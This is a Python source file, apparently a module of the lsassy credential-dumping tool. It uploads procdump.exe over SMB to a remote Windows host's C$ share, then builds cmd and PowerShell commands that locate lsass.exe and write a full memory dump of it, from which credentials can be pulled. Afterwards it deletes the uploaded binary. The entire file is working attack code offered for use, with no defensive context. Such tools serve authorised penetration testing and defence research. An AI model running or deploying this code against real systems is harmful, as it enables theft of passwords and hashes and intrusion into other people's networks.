import logging
import os
import time

from lsassy.dumpmethod import IDumpMethod
from lsassy.impacketfile import ImpacketFile


class DumpMethod(IDumpMethod):
    custom_dump_ext_support = False
    dump_ext = "dmp"

    def __init__(self, session, timeout):
        super().__init__(session, timeout)
        self.procdump = "procdump.exe"
        self.procdump_path = False
        self.procdump_remote_share = "C$"
        self.procdump_remote_path = "\\Windows\\Temp\\"

        self.procdump_uploaded = False

    def prepare(self, options):
        self.procdump = options.get("procdump", self.procdump)
        self.procdump_path = options.get("procdump_path", self.procdump_path)
        self.procdump_remote_share = options.get("procdump_remote_share", self.procdump_remote_share)
        self.procdump_remote_path = options.get("procdump_remote_path", self.procdump_remote_path)

        if not self.procdump_path:
            logging.error("Missing procdump_path")
            return None

        if not os.path.exists(self.procdump_path):
            logging.error("{} does not exist.".format(self.procdump_path))
            return None

        # Upload procdump
        logging.debug('Copy {} to {}'.format(self.procdump_path, self.procdump_remote_path))
        with open(self.procdump_path, 'rb') as p:
            try:
                self._session.smb_session.putFile(self.procdump_remote_share, self.procdump_remote_path + self.procdump, p.read)
                logging.success("Procdump successfully uploaded")
                self.procdump_uploaded = True
                return True
            except Exception as e:
                logging.error("Procdump upload error", exc_info=True)
                return None

    def clean(self):
        if self.procdump_uploaded:
            ImpacketFile.delete(self._session, self.procdump_remote_path + self.procdump, timeout=self._timeout)

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma %J {}{}""".format(
            self.procdump_remote_path, self.procdump,
            self.dump_path, self.dump_name
        )
        pwsh_command = """{}{} -accepteula -o -ma (Get-Process lsass).Id {}{}""".format(
            self.procdump_remote_path, self.procdump,
            self.dump_path, self.dump_name
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
